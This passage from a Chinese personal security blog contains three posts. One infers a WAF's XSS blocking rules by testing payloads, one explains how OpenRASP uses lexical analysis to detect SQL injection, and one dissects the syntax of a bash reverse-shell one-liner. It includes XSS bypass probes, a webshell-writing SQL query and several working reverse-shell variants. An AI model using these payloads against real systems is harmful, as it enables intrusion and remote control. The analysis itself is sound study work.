-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxxx&#x2F;src&#x3D;&quot;data:text&#x2F;html;x&quot;&gt;  拦截</span><br><span class="line">a&#x3D;&lt;xxxx&#x2F;src&#x3D;&quot;data:text&#x2F;htmlx;x&quot;&gt; 不拦截   说明属性值一定以 data:text&#x2F;html; 开头</span><br><span class="line">a&#x3D;&lt;xxxx&#x2F;src1&#x3D;&quot;data:text&#x2F;html;x&quot;&gt; 不拦截   说明属性名一定是 src</span><br><span class="line"></span><br><span class="line">a&#x3D;&lt;xxxx&#x2F;src&#x3D;&quot;data:text&#x2F;html;1&quot;&gt;  拦截   说明 data:text&#x2F;html; 一定要有一个字符</span><br></pre></td></tr></table></figure>
-
-<p>小结：任意标签 &amp;&amp; src属性 &amp;&amp; src属性值匹配 <code>data:text/html;[\s\S]+</code> 则拦截</p>
-<ul>
-<li>srcdoc属性<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxxx&#x2F;srcdoc&#x3D;xxx&gt;  拦截</span><br><span class="line">a&#x3D;&lt;xxxx&#x2F;srcdoc&#x3D;xx&gt; 不拦截</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>小结：任意标签 &amp;&amp; srcdoc属性 &amp;&amp; srcdoc属性值长度大于等于3 则拦截</p>
-<ul>
-<li>data、formaction、action、xlink:href属性<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;data&#x3D;javascript:x&gt;   拦截</span><br><span class="line"></span><br><span class="line">a&#x3D;&lt;xxx&#x2F;dataxxx&#x3D;javascript:x&gt;   不拦截</span><br><span class="line"></span><br><span class="line">a&#x3D;&lt;xxx&#x2F;data&#x3D;javascriptxx:x&gt;   不拦截</span><br><span class="line"></span><br><span class="line">a&#x3D;&lt;xxx&#x2F;data&#x3D;javascriptxx:&gt;   不拦截</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>小结：</p>
-<p>这几个属性和前面的href属性类似</p>
-<p>任意标签 &amp;&amp; data属性 &amp;&amp; data属性值匹配 <code>javascript:[\s\S]+</code> 则拦截</p>
-<hr>
-<ul>
-<li>可以得出来的结论<br>可以得出结论，策略如下：</li>
-<li>任意标签 &amp;&amp; (href属性||data属性|formaction属性||action属性||xlink:href） &amp;&amp; 相应属性值匹配 <code>javascript:[\s\S]+</code> 则拦截</li>
-<li>任意标签 &amp;&amp; src属性 &amp;&amp; src属性值匹配 <code>data:text/html;[\s\S]+</code> 则拦截</li>
-<li>任意标签 &amp;&amp; srcdoc属性 &amp;&amp; srcdoc属性值长度大于等于3 则拦截</li>
-</ul>
-<h2 id="验证其他猜想"><a href="#验证其他猜想" class="headerlink" title="验证其他猜想"></a>验证其他猜想</h2><ul>
-<li><p>属性名和属性值是否分开验证？</p>
-<p>以下payload全部拦截</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;xxx&#x2F;data&#x3D;&quot;data:text&#x2F;html;x&quot;&gt;</span><br><span class="line">&lt;xxx&#x2F;action&#x3D;&quot;data:text&#x2F;html;x&quot;&gt;</span><br><span class="line">&lt;xxx&#x2F;formaction&#x3D;&quot;data:text&#x2F;html;x&quot;&gt;</span><br><span class="line">&lt;xxx&#x2F;href&#x3D;&quot;data:text&#x2F;html;x&quot;&gt;</span><br><span class="line">&lt;xxx&#x2F;xlink:href&#x3D;&quot;data:text&#x2F;html;x&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可以看出来，只要属性值和属性名称命中防护规则，不论属性是否真的可以造成攻击，都会被拦截。</p>
-<p>所以得出结论：属性名和属性值是分开验证的，安全防护策略如下：</p>
-<ul>
-<li>任意标签 &amp;&amp; (href属性||data属性|formaction属性||action属性||xlink:href属性|src属性） &amp;&amp; 相应属性值匹配 <code>javascript:[\s\S]+</code>或<code>data:text/html;[\s\S]+</code> 则拦截</li>
-</ul>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>可能的安全防护策略如下</p>
-<ul>
-<li>任意标签 &amp;&amp; (href属性||data属性|formaction属性||action属性||xlink:href属性|src属性） &amp;&amp; 相应属性值匹配 <code>javascript:[\s\S]+</code>或<code>data:text/html;[\s\S]+</code> 则拦截</li>
-<li>任意标签 &amp;&amp; srcdoc属性 &amp;&amp; srcdoc属性值长度大于等于3 则拦截</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-03-11-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(1)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-03-11-%E7%BB%86%E5%93%81%E6%9F%90%E8%AF%AD%E4%B9%89waf%E7%9A%84xss%E9%98%B2%E6%8A%A4(1)/" class="post-title-link" itemprop="url">细品某语义waf的xss防护(1)</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-03-11 19:23:55 / 修改时间：19:57:27" itemprop="dateCreated datePublished" datetime="2021-03-11T19:23:55+08:00">2021-03-11</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>假设攻击场景如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xss漏洞输出位置如下:</span><br><span class="line"></span><br><span class="line">  &lt;div&gt;用户输出可控位置&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">攻击者准备利用on事件来执行js,比如</span><br><span class="line"></span><br><span class="line">  &lt;div&gt;&lt;svg onload&#x3D;&quot;alert(&#39;xss&#39;);&quot;&gt;&lt;&#x2F;div&gt;   利用onload属性</span><br></pre></td></tr></table></figure>
-
-<p>验证在这个场景下厂商的安全防护策略</p>
-<p>分析思路：</p>
-<ol>
-<li>改变payload，根据拦截情况推测安全防护策略</li>
-</ol>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;  不拦截</span><br><span class="line">a&#x3D;&lt;img&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;  拦截</span><br></pre></td></tr></table></figure>
-<p>说明区分了认识的标签和不认识的标签</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;a&#x3D;&lt;div&#x2F;oxx&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;&#39;    不拦截</span><br><span class="line">&#39;a&#x3D;&lt;div&#x2F;onxx&#x3D;&quot;xxx.xxx&#x3D;aaaa&quot;&gt;&#39;   拦截</span><br></pre></td></tr></table></figure>
-<p>拦截on事件，只要以on开头就拦截</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa(&#39;&#39;;&quot;&gt;   on属性值中少一个右括号就不拦截，说明判断js语法是否正确</span><br><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa(&#39;&#39;);&quot;&gt;   拦截</span><br><span class="line">a&#x3D;&lt;xxx&#x2F;onmouseover&#x3D;&quot;xxx.xxx&#x3D;aaaa;&quot;&gt;   不拦截</span><br></pre></td></tr></table></figure>
-<p>未知标签 &amp;&amp; on事件 &amp;&amp; 解析on属性中js &amp;&amp; on属性中调用了函数   则拦截</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;xxx&#x2F;onxxx&#x3D;a();&gt;     不拦截</span><br><span class="line">a&#x3D;&lt;xxx&#x2F;onxxx&#x3D;xxxxx;a();&gt;   拦截</span><br></pre></td></tr></table></figure>
-<p>on属性值需要大于一定长度</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;&lt;img&#x2F;onxxxx&#x3D;&quot;aaa&quot;&gt;  不拦截</span><br><span class="line"></span><br><span class="line">a&#x3D;&lt;img&#x2F;onxxxx&#x3D;&quot;aaaaaaa&quot;&gt;   拦截</span><br></pre></td></tr></table></figure>
-<p>已知标签on属性值大于一定长度则拦截</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>存在HTML解析和JS解析</p>
-<p>安全防护策略可能是：</p>
-<ul>
-<li>HTML解析 &amp;&amp; 未知标签 &amp;&amp; on事件 &amp;&amp; on属性值大于一定长度 &amp;&amp; 对on属性值做JS解析 &amp;&amp; on属性中调用了函数   则拦截</li>
-<li>HTML解析 &amp;&amp; 已知标签 &amp;&amp; on事件 &amp;&amp; on属性值大于一定长度  则拦截</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-03-06-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E5%9C%A8%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-03-06-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90%E5%9C%A8%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" class="post-title-link" itemprop="url">词法分析在安全产品中的应用</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-03-06 16:54:42 / 修改时间：23:37:07" itemprop="dateCreated datePublished" datetime="2021-03-06T16:54:42+08:00">2021-03-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>最近分析了一些waf、rasp等安全产品，发现核心检测逻辑非常依赖词法分析。</p>
-<p>总结一点东西：</p>
-<ul>
-<li>词法分析是什么？</li>
-<li>举个例子：OpenRASP怎么用到词法分析做安全策略？</li>
-<li>怎么实现词法分析？</li>
-<li>还有哪些安全防护产品用到词法分析？</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="词法分析是什么？"><a href="#词法分析是什么？" class="headerlink" title="词法分析是什么？"></a>词法分析是什么？</h2><p>词法分析可以将字符串按照自己的规则变成一串token。</p>
-<p>比如一个算术表达式 <code>1+2*3</code>，按照一定规则做词法分析后可以变成 <code>NUM ADD NUM MUL NUM</code> 一串token。</p>
-<p>编程语言在执行前也要做词法分析，比如Python词法分析结果是这样子的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python -m tokenize</span><br><span class="line">a&#x3D;1</span><br><span class="line"></span><br><span class="line">1,0-1,1:	NAME	&#39;a&#39;</span><br><span class="line">1,1-1,2:	OP	&#39;&#x3D;&#39;</span><br><span class="line">1,2-1,3:	NUMBER	&#39;1&#39;</span><br><span class="line">1,3-1,4:	NEWLINE	&#39;\n&#39;</span><br></pre></td></tr></table></figure>
-
-<h2 id="安全产品怎么用到词法分析做安全策略？"><a href="#安全产品怎么用到词法分析做安全策略？" class="headerlink" title="安全产品怎么用到词法分析做安全策略？"></a>安全产品怎么用到词法分析做安全策略？</h2><p>拿OpenRASP举例，OpenRASP检测SQL注入、命令执行时核心检测算法非常依赖词法分析。</p>
-<ul>
-<li><p>先看看请求是怎么到检测插件的</p>
-<p>  OpenRASP可以作为PHP扩展保护PHP应用，在扩展被加载时hook了很多执行sql的函数，比如openrasp项目<code>agent/php5/hook/openrasp_mysqli.cc</code>文件中可以看到hook了mysqli模块的函数。</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * mysqli相关hook点</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">PRE_HOOK_FUNCTION(mysqli_query, SQL);</span><br><span class="line">POST_HOOK_FUNCTION(mysqli_query, SQL_ERROR);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>  当业务代码在做数据库查询时，如果调用<code>mysqli_query</code>等函数执行SQL，就会在执行SQL前经过OpenRASP的检测策略。</p>
-<p>  检测策略文件是JavaScript写的，代码位置在<code>plugins/official/plugin.js</code>。</p>
-<p>  在执行SQL注入检查时，会传入即将执行的SQL（如 “select * from users where a=1”）和完整的请求信息（包含请求参数）。</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">plugin.register(&#39;sql&#39;, function (params, context) &#123;  &#x2F;&#x2F;params.query包含完整sql，context包含完整请求</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>OpenRASP怎么做SQL注入检测？</p>
-<p>  SQL注入检测策略默认开启了三种：</p>
-<pre><code>* 词法分析后，判断用户输入是否改变SQL执行逻辑
-* 词法分析后，判断SQL语句是否有写文件操作、使用黑名单函数等
-* sql server执行异常</code></pre>
-<p>  第一类SQL注入检测策略：对即将执行的sql语句做分词，判断用户的输入占用了几个token，正常情况下，用户输入应该只占有一个token。 比如最终执行sql是select id from user where name=”user_input_name”， 正常请求时 “user_input_name” 会变成一个字符串token。如果碰到恶意请求闭合了双引号，用户输入就至少占用两个token。</p>
-<p>  详细可见官方文档 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/50AFAVp8dSwuc1ACY5kRKw">OpenRASP v0.20 发布 | 性能提升与零规则漏洞检测</a>。</p>
-<p>  实现的代码在 <code>plugins/official/plugin.js</code>文件</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; raw_tokens包含有词法分析得到的token串</span><br><span class="line">&#x2F;&#x2F; userinput_idx是用户输入在最终执行的sql的开始位置</span><br><span class="line"></span><br><span class="line">if (is_token_changed(raw_tokens, userinput_idx, value.length, distance, is_sql&#x3D;true)) &#123;</span><br><span class="line">    reason &#x3D; _(&quot;SQLi - SQL query structure altered by user input, request parameter name: %1%, value: %2%&quot;, [name, value])</span><br><span class="line">    return true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>  第二类SQL注入检测策略：检查分词后的token串中是否命中规则。</p>
-<p>  比如 为了对抗”利用SQL注入中写webshell”这种攻击方式，就检查最终执行的sql语句是否包含 [“into”,”outfile”]和[“into”,”dumpfile”] 两类token</p>
-<p>  <code>select &quot;webshell.txt&quot; into outfile &#39;/var/www/webshell.php&#39;</code> 可以用来写入Webshell</p>
-<p>  检测策略的实现代码也在 plugin.js 中可以看到</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">else if (features[&#39;into_outfile&#39;] &amp;&amp; i &lt; tokens_lc.length - 2 &amp;&amp; tokens_lc[i] &#x3D;&#x3D; &#39;into&#39;)</span><br><span class="line"> &#123;</span><br><span class="line">     if (tokens_lc[i + 1] &#x3D;&#x3D; &#39;outfile&#39; || tokens_lc[i + 1] &#x3D;&#x3D; &#39;dumpfile&#39;)</span><br><span class="line">     &#123;</span><br><span class="line">         reason &#x3D; _(&quot;SQLi - Detected INTO OUTFILE phrase in sql query&quot;)</span><br><span class="line">         break</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-
-<p>  命令执行检测同样也依赖词法分析。</p>
-<p>  可以看出来OpenRASP中词法分析在sql注入、命令执行检测算法中目前很重要。</p>
-</li>
-</ul>
-<h2 id="怎么实现词法分析？"><a href="#怎么实现词法分析？" class="headerlink" title="怎么实现词法分析？"></a>怎么实现词法分析？</h2><p>OpenRASP有两个JS接口可以获取分析后的token串，见<a target="_blank" rel="noopener" href="https://rasp.baidu.com/doc/dev/api/rasp.html#sql_tokenize">sql_tokenize</a></p>
-<p>实现接口的代码在openrasp-v8项目中<code>base/flex/flex.cc</code>文件，这个文件是flex工具生成的，原始的规则文件并没有开源出来。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static sql_tokenize(query) &#123;</span><br><span class="line">    return tokenize(query, &quot;sql&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static cmd_tokenize(query) &#123;</span><br><span class="line">    return tokenize(query, &#39;bash&#39;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>从实现角度上看，词法分词可以分为三类：</p>
-<ul>
-<li>借助工具，如flex、antlr。openrasp就是用借助flex做的</li>
-<li>纯手写实现，比如 <a target="_blank" rel="noopener" href="https://github.com/client9/libinjection">libinjection</a></li>
-<li>combinator库等半自动</li>
-</ul>
-<h2 id="哪些安全产品用到了词法分析？"><a href="#哪些安全产品用到了词法分析？" class="headerlink" title="哪些安全产品用到了词法分析？"></a>哪些安全产品用到了词法分析？</h2><ul>
-<li>openrasp</li>
-<li>waf<ul>
-<li>libinjection</li>
-<li>命令执行防护</li>
-<li>xss防护</li>
-<li>sql注入防护</li>
-</ul>
-</li>
-<li>hids<ul>
-<li>webshell检测</li>
-</ul>
-</li>
-<li>db防火墙</li>
-<li>代码混淆与反混淆</li>
-<li>…</li>
-</ul>
-<p>上面的部分产品除了用到词法分析，还会用到语法分析、语义分析。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要还是围绕OpenRASP来写的这篇文章，没有细讲词法分析的实现、做项目时应该用工具还是完全手写词法分析、语法分析这类检测引擎的误报和漏报场景等问题。</p>
-<p>关于词法分析、语法分析的原理、算法和实现，推荐看 <a target="_blank" rel="noopener" href="https://time.geekbang.org/column/intro/219">编译原理之美</a> 这个课程，一级棒。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1755588">OpenRASP SQL注入绕过</a></li>
-<li><a target="_blank" rel="noopener" href="https://rasp.baidu.com/">OpenRASP官网</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-03-04-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-03-04-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">分析bash反弹shell的语法</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-03-04 21:54:26 / 修改时间：21:55:08" itemprop="dateCreated datePublished" datetime="2021-03-04T21:54:26+08:00">2021-03-04</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>对下面的反弹shell语法细节有些模糊，故分析一下。</p>
-<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>-i 参数</p>
-<p>  生成交互式shell</p>
-</li>
-<li><p><code>&gt;&amp;</code> 是什么？</p>
-<p>  bash中<code>&gt;&amp;</code>语法比较特殊，有两种解释：</p>
-<ul>
-<li><p>后面接数字时，如<code>&gt;&amp;1</code>表示复制文件描述符</p>
-</li>
-<li><p>后面接非数字时，如<code>&gt;&amp;xxx</code>表示标准输入和标准输出重定向</p>
-<p>可以查看<code>man bash</code>手册，有详细介绍。</p>
-<p>在这个反弹shell中，第一个<code>&gt;&amp;</code>含义是 把标准输入和标准输出重定向到socket</p>
-</li>
-</ul>
-</li>
-<li><p><code>/dev/tcp/127.0.0.1/2222</code> 是什么？</p>
-<p>  它不是文件，只是bash解释器会对/dev/tcp对特殊处理，代表了一个tcp socket。</p>
-<p>  所以如果其他的sh解释器，如zsh、ksh等没有这个特殊解释时，就不能用这个来打开socket。</p>
-<p>  更详细的可以看参考资料</p>
-</li>
-<li><p><code>0&gt;&amp;1</code> 是什么？</p>
-<p>  将标准输入重定向到标准输出</p>
-</li>
-<li><p>“&gt;&amp; /dev/tcp/127.0.0.1/2222”  为什么不是 “&gt; /dev/tcp/127.0.0.1/2222”？</p>
-<p>  bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
-<p>  其实是可以的，不过这样标准错误就没有重定向到socket。可以通过查看 /proc/{pid}/fd/ 验证</p>
-</li>
-</ul>
-<p>根据上面的了解，可以推导出 这个反弹shell会将自己的标准输入、标准输出、标准错误全部重定向到同一个socket。</p>
-<h1 id="动手实验"><a href="#动手实验" class="headerlink" title="动手实验"></a>动手实验</h1><ol>
-<li><p>验证<code>&gt;&amp;</code>语法</p>
-<p> <code>&amp;&gt;</code>是一种特殊情况</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;111   因为 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;复制文件描述符&quot;来执行。执行命令时因为不存在111文件描述符，所以报错</span><br><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;xxx   因为不是 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;重定向标准输出和标准错误&quot;来执行</span><br><span class="line"></span><br><span class="line">执行结果，只有xxx文件，没有111文件</span><br><span class="line">[root@instance-fj5pftdp t]# ls</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure></li>
-<li><p>验证 文件描述符指向 socket</p>
-<p> 执行<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>后的文件描述符指向了同一个socket</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ls -al &#x2F;proc&#x2F;4961&#x2F;fd&#x2F;</span><br><span class="line">总用量 0</span><br><span class="line">dr-x------ 2 root root  0 2月  19 11:26 .</span><br><span class="line">dr-xr-xr-x 9 root root  0 2月  19 11:26 ..</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 0 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 1 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:26 2 -&gt; socket:[201270351]</span><br></pre></td></tr></table></figure>
-
-<p> 如果执行<code>bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>，标准错误描述符就不会指向socket</p>
-<p> 另外命令中需要注意到空格，”[n]&gt;&amp;word”可以写成”[n]&gt;&amp; word”，不可以写成”[n] &gt;&amp;word”</p>
-<p> 比如下面命令反弹shell会有些问题</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1 &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0 &gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p> 而下面命令可以反弹shell</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i 1&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp; 1</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;2</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要还是学习bash相关知识点，包括：</p>
-<ul>
-<li>“&gt;&amp;”的两种用法</li>
-<li>“/dev/tcp/127.0.0.1/2222” 不是文件，而是bash解释器对起特殊处理</li>
-</ul>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f10736931b93">【bash】关于 /dev/tcp/${HOST}/${PORT}</a></li>
